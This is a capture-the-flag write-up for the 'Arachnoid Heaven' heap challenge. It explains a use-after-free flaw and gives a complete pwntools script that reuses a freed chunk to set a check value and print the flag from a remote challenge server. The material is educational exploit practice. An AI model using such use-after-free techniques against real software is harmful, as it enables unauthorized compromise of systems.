# Arachnoid Heaven (Pwn) Writeup
Running the binary, we can quickly conclude that this is a heap challenge.

![alt text](https://github.com/BillBrousalis/htb_uni_ctf_writeups/blob/main/arachnoid_heaven/screenshots/arachnoid_menu.png)

Reading the pseudocode in ida, we come across the **obtain** function:

![alt text](https://github.com/BillBrousalis/htb_uni_ctf_writeups/blob/main/arachnoid_heaven/screenshots/arachnoid_win_func.png)

It checks if the *Code* corresponding to a particular arachnoid is set to 'sp1d3y',
and if so, it prints out the flag.

The user chooses the arachnoid index to obtain, and nothing is stopping us from
selecting a chunk that has been freed.
So there we have it: a **Use-After-Free vulnerability**.
We can use this to exploit the program.

```
#!/usr/bin/env python3
from pwn import *

def exploit():
  _bin = './arachnoid_heaven'
  elf = ELF(_bin)
  local = False

  if local:
    log.info('** Running exploit LOCALLY **')
    r = elf.process()
  else:
    log.info('** Running exploit against REMOTE server **')
    ip, port = '167.172.58.213', 31168   # CHANGE THIS
    r = remote(ip, port)
  
  r.sendlineafter(b'>', b'1') # craft arachnoid
  r.sendlineafter(b'Name:', b'koulis') # initial spider name

  r.sendlineafter(b'>', b'2') # delete arachnoid
  r.sendlineafter(b'Index:', b'0') # select 1st arachnoid

  r.sendlineafter(b'>', b'1') # craft arachnoid again
  # name it sp1d3y, so arachnoid's Code at index 0 is set to sp1d3y
  r.sendlineafter(b'Name:', b'sp1d3y')

  r.sendlineafter(b'>', b'4') # obtain arachnoid with index 0
  r.sendlineafter(b'Arachnoid:', b'0')

  r.recvline() # junk
  log.success('** PWNED **')
  flag = r.recvline().decode()
  log.success(f'flag : {flag}')


if __name__ == '__main__':
  exploit()
```

## And there we have it:

![alt text](https://github.com/BillBrousalis/htb_uni_ctf_writeups/blob/main/arachnoid_heaven/screenshots/arachnoid_flag.png)
